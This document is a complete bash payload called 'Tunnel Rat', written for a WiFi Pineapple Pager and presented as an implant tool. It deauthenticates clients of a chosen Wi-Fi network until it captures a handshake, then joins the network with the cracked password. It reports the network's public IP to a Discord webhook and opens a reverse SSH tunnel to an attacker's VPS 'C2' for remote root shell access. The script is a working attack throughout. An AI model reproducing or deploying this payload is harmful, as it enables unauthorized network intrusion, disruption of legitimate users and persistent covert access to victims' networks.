#!/bin/bash
# Tunnel Rat
# github.com/OSINTI4L
# Tunnel Rat is a Hak5 WiFi Pineapple Pager payload that allows remote access to the pager through a virtual private server reverse SSH tunnel. This allows the pager to be used as an implant device allowing for remote exploitation of the target network. See attached README.md for full documentation and setup.
# Dependencies: sshpass | VPS | Discord webhook
# Built on WiFi Pineapple Pager firmware v1.0.6

MAPSSID="Name-Management-Portal-SSID-Here"
MAPPASS="Enter-Management-Portal-Password-Here"
DISCORD_WEBHOOK="https://discord.com/api/webhooks/Enter/Discord/Webhook/Here"
VPSIP="X.X.X.X-Enter-VPS-C2-IP-Here"
SSHPW="Enter-VPS-C2-SSH-Password-Here"

# Enter target SSID:
TARGETSSID="$(TEXT_PICKER 'Enter target network SSID' '')"
    LOG blue "Target network: $TARGETSSID"
    sleep 1.5

# Idle for 1 min to scan wireless airspace:
spinner1=$(START_SPINNER "Scanning wireless airspace")
    sleep 60
    TARGETMAC=$(_pineap RECON ISEARCH "$TARGETSSID" | awk '{print $1}' | head -n 1)
STOP_SPINNER "${spinner1}"

# If network lock/log channel to target MAC, else exit:
if [ -n "$TARGETMAC" ]; then
    LOG green "$TARGETSSID found!"
    sleep 1.5
    LOG blue "Optomizing for handshake capture.."
    sleep 1.5
    PINEAPPLE_EXAMINE_BSSID "$TARGETMAC"
    TARGETCH=$(_pineap RECON ISEARCH "$TARGETSSID" | grep -i "$TARGETSSID" | awk '{print $5}' | head -n 1)
    LOG green "Radio optomized."
    sleep 1.5
    LOG blue "Waiting for handshake capture.."
    sleep 1.5
else
    ALERT "$TARGETSSID not found!"
    LOG red "Exiting."
    exit 0
fi

# Check for .22000 handshake, if handshake configure filename/spawn MGMT AP, else deauth/sleep 1 minute and check again, loop until handshake:
CLEANMAC=$(echo "$TARGETMAC" | tr -d ':')
PCAP=$(find /root/loot/handshakes -name "*$CLEANMAC*_handshake.22000" | head -n 1)
DEAUTHTARG() {
    _pineap DEAUTH "$TARGETMAC" "FF:FF:FF:FF:FF:FF" "$TARGETCH"
}
if [ -n "$PCAP" ]; then
    LOG green "Handshake found!"
    sleep 1.5
else
    while [ -z "$PCAP" ]; do
        LOG red "Handshake not found!"
        sleep 1.5
        spinner2=$(START_SPINNER "Deauthing $TARGETSSID and re-checking")
        DEAUTHTARG
        sleep 60
        PCAP=$(find /root/loot/handshakes -name "*$CLEANMAC*_handshake.22000" | head -n 1)
        STOP_SPINNER "${spinner2}"
    done
        LOG green "Handshake found!"
        sleep 1.5
fi

# Strip path from .22000 handshake:
CLEANCAP=$(basename "$PCAP")

# Simplify file.extension:
cp /root/loot/handshakes/"$CLEANCAP" /root/loot/handshakes/"$TARGETSSID"_handshake.22000

# Reset recon mode:
LOG blue "Resuming channel hopping.."
PINEAPPLE_EXAMINE_RESET
sleep 10
LOG green "Channel hopping resumed."
sleep 1.5

# Spawn MGMT AP for handshake retrieval:
WIFI_MGMT_AP wlan0mgmt "$MAPSSID" psk2 "$MAPPASS"

# Prompt for target network password:
TARGETPASS="$(TEXT_PICKER 'PCAP AVAILABLE' 'Enter target password')"
    LOG green "Password: $TARGETPASS"
    sleep 1.5

# Shutdown MGMT AP:
spinner2=$(START_SPINNER "Shutting down $MAPSSID")
    WIFI_MGMT_AP_DISABLE wlan0mgmt
    APISDOWN="false"
    for i in {1..12}; do
        APDOWNCHK="$(ifconfig | grep -i wlan0mgmt)"
        if [ -z "$APDOWNCHK" ]; then
            APISDOWN="true"
            break
        else
            sleep 10
        fi
    done
STOP_SPINNER "${spinner2}"

if [ "$APISDOWN" != "true" ]; then
    ALERT "Error shutting down $MAPSSID!"
    LOG red "Exiting."
    exit 0
fi

LOG green "$MAPSSID shutdown complete!"
sleep 1.5

# Get on network:
spinner3=$(START_SPINNER "Connecting to $TARGETSSID")
    WIFI_CONNECT wlan0cli "$TARGETSSID" psk2 "$TARGETPASS" ANY
    LANCONNECTED="false"
    for i in {1..12}; do
        LANCHK=$(ip -4 addr show dev wlan0cli scope global | grep -i inet)
        if [ -n "$LANCHK" ]; then
            LANCONNECTED="true"
            break
        else
            sleep 10    
        fi
    done
STOP_SPINNER "${spinner3}"

if [ "$LANCONNECTED" != "true" ]; then
    ALERT "Could not connect to $TARGETSSID!"
    LOG red "Exiting."
    exit 0
fi

LOG green "Connected to $TARGETSSID!"
sleep 1.5

# Check for internet connectvity:
INETCHECK() {
        ping -c1 discord.com
}
LOG blue "Checking for internet connectivity.."
sleep 1.5
INETCON="false"
for i in {1..12}; do
    if INETCHECK; then
	    LOG green "Internet connection available!"
        sleep 1.5
		PIP=$(curl -s https://api.ipify.org)
        LOG blue "Sending $TARGETSSID public IP: $PIP to Discord webhook.."
        curl -H "Content-Type: application/json" \
        -X POST \
        -d "{\"content\": \"WiFi Pineapple Pager network connected at: $PIP Checking if VPS C2 at: $VPSIP is online..\"}" \
        "$DISCORD_WEBHOOK"
        INETCON="true"
        break
    else
        sleep 10
    fi
done

if [ "$INETCON" != "true" ]; then
    ALERT "Internet connectivity not available!"
    LOG red "Exiting."
    exit 0
fi

sleep 1

# Check if VPS C2 is online:
PINGVPS() {
    ping -c1 "$VPSIP"
}
LOG blue "Checking status of VPS C2 at: $VPSIP.."
sleep 1.5
VPSUP="false"
for i in {1..12}; do
    if PINGVPS; then
        LOG green "VPS C2 at: $VPSIP is online!"
        curl -H "Content-Type: application/json" \
        -X POST \
        -d "{\"content\": \"VPS C2 at: $VPSIP is online! Attempting to establish reverse SSH tunnel..\"}" \
        "$DISCORD_WEBHOOK"
        VPSUP="true"
        break
    else
        sleep 10
    fi
done

if [ "$VPSUP" != "true" ]; then
    ALERT "Cannot reach VPS C2 at: $VPSIP!"
    LOG red "Exiting."
    curl -H "Content-Type: application/json" \
    -X POST \
    -d "{\"content\": \"VPS C2 at: $VPSIP is not online! Exiting.\"}" \
    "$DISCORD_WEBHOOK"
    exit 0
fi

sleep 1

# Establish reverse SSH tunnel:
spinner4=$(START_SPINNER "Establishing SSH tunnel")
    ESTABTUNNEL() {
        (/mmc/usr/bin/sshpass -p "$SSHPW" ssh -o "StrictHostKeyChecking=no" -o "ConnectTimeout=15" -N -R 127.0.0.1:2222:localhost:22 root@"$VPSIP" &)
    }
    TUNNELCHECK() {
        netstat -tnpa | grep "$VPSIP":22 | grep -i ESTABLISHED
    }
    TUNCHK="false"
    for i in {1..12}; do
        ESTABTUNNEL
        sleep 15
        if TUNNELCHECK; then
            curl -H "Content-Type: application/json" \
            -X POST \
            -d "{\"content\": \"Reverse SSH tunnel established! Access WiFi Pineapple Pager root shell at VPS C2: $VPSIP via: ssh -p 2222 root@127.0.0.1\"}" \
            "$DISCORD_WEBHOOK"
            TUNCHK="true"
            break
        else
            killall -q ssh
            killall -q sshpass
            sleep 3
        fi
    done
STOP_SPINNER "${spinner4}"

if [ "$TUNCHK" != "true" ]; then
    ALERT "Reverse SSH tunnel could not be established!"
    LOG red "Exiting."
    curl -H "Content-Type: application/json" \
    -X POST \
    -d "{\"content\": \"Reverse SSH tunnel could not be established! Exiting.\"}" \
    "$DISCORD_WEBHOOK"
    exit 0
fi

sleep 1.5
LOG green "Reverse SSH tunnel established!"
LOG green "Access WiFi Pineapple Pager root shell at VPS C2: $VPSIP via: ssh -p 2222 root@127.0.0.1"
